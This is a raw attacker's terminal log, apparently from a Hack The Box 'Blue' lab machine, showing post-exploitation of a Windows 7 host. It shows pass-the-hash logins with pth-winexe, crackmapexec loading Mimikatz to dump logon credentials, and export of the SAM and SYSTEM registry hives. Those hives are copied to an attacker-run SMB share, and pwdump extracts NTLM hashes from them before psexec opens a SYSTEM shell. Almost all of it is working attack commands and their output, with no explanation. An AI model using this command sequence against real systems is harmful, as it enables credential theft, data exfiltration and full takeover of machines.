E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
haris-pc\administrator

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::b8a4:c9fc:2488:f88a
   Temporary IPv6 Address. . . . . . : dead:beef::d36:f68c:c97d:f83
   Link-local IPv6 Address . . . . . : fe80::b8a4:c9fc:2488:f88a%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.40
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a0b9%11
                                       10.10.10.2

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32>




root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\Administrator cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
MIMIKATZ     10.10.10.40:445 HARIS-PC        [+] Executed payload
MIMIKATZ                                       [*] Waiting on 1 host(s)
MIMIKATZ     10.10.10.40                       [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
MIMIKATZ                                       [*] Waiting on 1 host(s)
MIMIKATZ                                       [*] Waiting on 1 host(s)
MIMIKATZ                                       [*] Waiting on 1 host(s)
MIMIKATZ     10.10.10.40                       [*] - - "POST / HTTP/1.1" 200 -
MIMIKATZ     10.10.10.40                       [*] Saved Mimikatz's output to Mimikatz-10.10.10.40-2021-04-28_212350.log
[*] KTHXBYE!
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 



root@kali:~/HTB/BLUE/AutoBlue-MS17-010# cat /root/.cme/logs/Mimikatz-10.10.10.40-2021-04-28_212350.log

  .#####.   mimikatz 2.1 (x64) built on Jun 28 2016 19:12:18
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 19 modules * * */

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

236	29290     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Primary
 -> Impersonated !
 * Process Token : 773861    	haris-PC\Administrator	S-1-5-21-319597671-3711062392-2889596693-500	(11g,23p)	Primary
 * Thread Token  : 1085734   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Impersonation (Delegation)

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 29/04/2021 03:09:23
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : HARIS-PC$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 29/04/2021 03:09:23
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : HARIS-PC$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : haris-pc$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 41407 (00000000:0000a1bf)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 29/04/2021 03:09:23
SID               : 
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : HARIS-PC$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 29/04/2021 03:09:23
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : HARIS-PC$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : haris-pc$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

mimikatz(powershell) # exit
Bye!
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 



C:\Windows\system32>reg save HKLM\SAM sam.backup
reg save HKLM\SAM sam.backup
The operation completed successfully.

C:\Windows\system32>reg save HKLM\SYSTEM system.backup
reg save HKLM\SYSTEM system.backup
The operation completed successfully.

C:\Windows\system32>dir sam.backup
dir sam.backup
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Windows\system32

29/04/2021  03:31            28,672 sam.backup
               1 File(s)         28,672 bytes
               0 Dir(s)  17,188,548,608 bytes free

C:\Windows\system32>dir system.backup
dir system.backup
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Windows\system32

29/04/2021  03:31        10,608,640 system.backup
               1 File(s)     10,608,640 bytes
               0 Dir(s)  17,188,548,608 bytes free

C:\Windows\system32>




root@kali:~/HTB/BLUE/AutoBlue-MS17-010# impacket-smbserver smbfolder $(pwd)
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.40,49167)
[*] AUTHENTICATE_MESSAGE (\,HARIS-PC)
[*] User HARIS-PC\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SMBFOLDER)
[*] AUTHENTICATE_MESSAGE (\,HARIS-PC)
[*] User HARIS-PC\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa


C:\Windows\system32>copy sam.backup \\10.10.14.28\smbfolder\sam
copy sam.backup \\10.10.14.28\smbfolder\sam
        1 file(s) copied.

C:\Windows\system32>copy system.backup \\10.10.14.28\smbfolder\system
copy system.backup \\10.10.14.28\smbfolder\system
        1 file(s) copied.

C:\Windows\system32>





root@kali:~/HTB/BLUE/AutoBlue-MS17-010# ls -la sam
-rwxr-xr-x 1 root root 28672 dic 31  1969 sam
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# ls -la system 
-rwxr-xr-x 1 root root 10608640 dic 31  1969 system
root@kali:~/HTB/BLUE/AutoBlue-MS17-010#



root@kali:~/HTB/BLUE/AutoBlue-MS17-010# pwdump system sam 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 




root@kali:~/HTB/BLUE/AutoBlue-MS17-010# pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.10.10.40 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::b8a4:c9fc:2488:f88a
   Temporary IPv6 Address. . . . . . : dead:beef::d36:f68c:c97d:f83
   Link-local IPv6 Address . . . . . : fe80::b8a4:c9fc:2488:f88a%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.40
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a0b9%11
                                       10.10.10.2

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32>



C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State  
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled

C:\Windows\system32>


root@kali:~/HTB/BLUE/AutoBlue-MS17-010# python /opt/impacket/examples/psexec.py WORKGROUP/admin:admin\@10.10.10.40
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.40.....
[*] Found writable share ADMIN$
[*] Uploading file EYrGMsRR.exe
[*] Opening SVCManager on 10.10.10.40.....
[*] Creating service XuvO on 10.10.10.40.....
[*] Starting service XuvO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>




